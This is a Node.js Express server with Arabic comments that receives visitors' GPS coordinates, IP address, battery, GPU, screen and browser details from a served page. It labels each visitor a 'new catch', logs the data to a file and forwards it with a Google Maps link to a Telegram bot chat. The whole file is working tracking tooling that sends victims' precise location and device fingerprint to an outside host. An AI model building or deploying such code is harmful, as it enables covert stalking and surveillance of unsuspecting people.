require('dotenv').config();
const express = require('express');
const https = require('https');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// وظيفة إرسال رسالة تلجرام باستخدام https المدمجة (بدون node-fetch)
function sendTelegram(token, chatId, text) {
    return new Promise((resolve, reject) => {
        const payload = JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown'
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${token}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            },
            timeout: 10000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                console.log('[Telegram] Response:', data.substring(0, 200));
                resolve(data);
            });
        });

        req.on('error', (e) => {
            console.error('[Telegram] Error:', e.message);
            reject(e);
        });

        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });

        req.write(payload);
        req.end();
    });
}

// الصفحة الرئيسية
app.get('/', (req, res) => {
    let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');

    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const fullUrl = protocol + '://' + req.get('host');

    html = html.replace(/SITE_URL/g, fullUrl);

    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');

    const hasToken = !!process.env.TELEGRAM_BOT_TOKEN;
    const hasChatId = !!process.env.TELEGRAM_CHAT_ID;
    console.log(`[Visit] ${req.headers['user-agent']?.substring(0, 50)} | Token=${hasToken}, ChatID=${hasChatId}`);

    res.send(html);
});

// استقبال بيانات الموقع (يدعم JSON و text/plain من sendBeacon)
app.post('/api/location', async (req, res) => {
    // إرسال الرد فوراً حتى لا يتعلق المتصفح
    res.json({ success: true });

    let data;
    if (typeof req.body === 'string') {
        try { data = JSON.parse(req.body); } catch (e) { data = req.body; }
    } else {
        data = req.body;
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const clientIp = data.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const ua = data.userAgent || '';
    const deviceType = /iPhone|iPad|iPod/i.test(ua) ? '📱 iPhone' : (/Android/i.test(ua) ? '🤖 Android' : '💻 PC');

    const message = `🎯 *صيد جديد (${deviceType})*
━━━━━━━━━━━━━━━━━━
📱 *الجهاز:* \`${data.platform || 'N/A'}\`
├ *المتصفح:* \`${ua.split(' ').pop()}\`
├ *الشاشة:* \`${data.screen || 'N/A'}\`
└ *الجرافيك:* \`${data.gpu || 'N/A'}\`

🔋 *الطاقة:* \`${data.battery?.level || 'N/A'}\` (${data.battery?.charging === 'Yes' ? '⚡ شحن' : '🔋 تفريغ'})

🌐 *الشبكة:*
├ *IP:* \`${data.ip || clientIp}\`
└ *الموقع:* ${data.country || 'غير معروف'} - ${data.city || 'غير معروف'}

📍 *GPS:*
├ *العرض:* \`${data.latitude}\`
├ *الطول:* \`${data.longitude}\`
└ *الدقة:* 🎯 \`${data.accuracy}\`

🗺️ *خرائط جوجل:*
https://www.google.com/maps?q=${data.latitude},${data.longitude}
━━━━━━━━━━━━━━━━━━`;

    console.log(`[HIT] ${deviceType} from ${clientIp}`);

    // حفظ نسخة احتياطية
    try {
        const logsPath = path.join(__dirname, 'logs.json');
        let logs = [];
        if (fs.existsSync(logsPath)) {
            try { logs = JSON.parse(fs.readFileSync(logsPath)); } catch (e) { logs = []; }
        }
        logs.push({ ...data, deviceType, clientIp, timestamp: new Date().toISOString() });
        fs.writeFileSync(logsPath, JSON.stringify(logs, null, 2));
    } catch (e) {
        console.error('[Logs] Save error:', e.message);
    }

    // إرسال لتلجرام
    if (token && chatId) {
        try {
            await sendTelegram(token, chatId, message);
            console.log('[Telegram] Sent successfully!');
        } catch (error) {
            console.error('[Telegram] Failed:', error.message);
        }
    } else {
        console.warn('[Telegram] Missing TOKEN or CHAT_ID!');
    }
});

// دعم sendBeacon (يرسل كـ text/plain)
app.post('/api/location', express.text({ type: 'text/plain' }), (req, res) => {
    // يتم معالجته بواسطة الـ handler أعلاه
});

// مسار اختبار
app.get('/api/test', async (req, res) => {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
        return res.send('❌ TOKEN أو CHAT_ID غير موجودين في Environment Variables!');
    }

    try {
        await sendTelegram(token, chatId, '🔔 اختبار: السيرفر متصل بتلجرام بنجاح!');
        res.send('✅ تم إرسال رسالة اختبار إلى تلجرام!');
    } catch (e) {
        res.status(500).send('❌ فشل: ' + e.message);
    }
});

// مسار تشخيصي
app.get('/api/status', (req, res) => {
    res.json({
        server: 'running',
        token: !!process.env.TELEGRAM_BOT_TOKEN,
        chatId: !!process.env.TELEGRAM_CHAT_ID,
        time: new Date().toISOString()
    });
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`   Token: ${process.env.TELEGRAM_BOT_TOKEN ? 'SET ✓' : 'MISSING ✗'}`);
    console.log(`   ChatID: ${process.env.TELEGRAM_CHAT_ID ? 'SET ✓' : 'MISSING ✗'}`);
});
